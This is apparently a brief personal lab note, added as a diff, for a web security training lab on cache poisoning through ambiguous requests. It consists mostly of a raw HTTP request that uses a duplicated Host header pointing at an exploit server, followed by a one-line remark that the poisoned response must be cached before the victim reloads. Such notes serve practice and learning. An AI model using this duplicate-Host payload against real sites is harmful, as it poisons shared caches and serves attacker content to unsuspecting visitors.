@@ -1,0 +1,26 @@
+Lab: Web cache poisoning via ambiguous requests
+
+
+'''
+GET / HTTP/1.1
+Host: 0a2a006e04f4dd4a8417bd2900b500c0.h1-web-security-academy.net
+Host: exploit-0a2600d00473ddd98489bc5001a5000c.exploit-server.net
+Cookie: session=pjdLAZVfnxQ6UEh8KRZTQeyD7fP52fLx; _lab=46%7cMCwCFFEOdGrsq46z5ccysMPajPU23aaPAhQIYpHN2ZjuRRp%2fyy3RoomZay%2fSGVoaAgAv477j8IEvnaa3LJAQuMHFOfSNM%2fc%2b2AN%2fd%2bLOUlDlXS63LFD8VkTbisVMcdThs5TJjMoRatN%2fEwbFie2SJ5pdyyeA4biqARvcfInFG2CvMnFKxGM%3d
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=0, i
+Connection: close
+'''
+
+this has to be cached then the victim has to click refresh the page
